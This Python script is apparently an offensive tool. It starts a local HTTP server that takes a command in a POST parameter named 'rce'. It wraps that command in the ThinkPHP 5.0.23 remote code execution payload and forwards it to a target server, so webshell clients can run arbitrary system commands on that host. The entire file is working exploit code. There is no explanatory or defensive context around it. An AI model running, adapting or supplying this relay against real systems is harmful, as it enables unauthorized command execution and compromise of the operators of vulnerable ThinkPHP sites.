from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import urllib.parse

# 指定目标URL，以 thinkphp 5.0.23 rce 为例
target_url = 'http://1.1.1.1:8080/index.php?s=captcha'

# burp proxy
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
    "Cookie": "rememberMe=1",
    "Content-Type": "application/x-www-form-urlencoded"
}


# 创建自定义请求处理程序
class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 获取POST请求的数据
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # 解析POST请求的参数
        ant = 'rce'
        params = urllib.parse.parse_qs(post_data)

        # 处理参数
        cmd = ''
        for key, values in params.items():
            if key.decode('utf-8') == ant:
                cmd = values[0].decode('utf-8')

        post_data = f'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={urllib.parse.quote_plus(cmd)}'

        # 转发POST请求和Cookie至目标URL
        response = requests.post(target_url, data=post_data, headers=headers)

        # 设置响应头
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        # 返回目标URL的响应给客户端
        self.wfile.write(response.content)

# 启动Web服务器
def run():
    port = 8081
    server_address = ('', port)  # 可根据需要修改端口号
    httpd = HTTPServer(server_address, RequestHandler)
    print(f'Start Common Post Forward Server On {port} ...')
    httpd.serve_forever()

run()
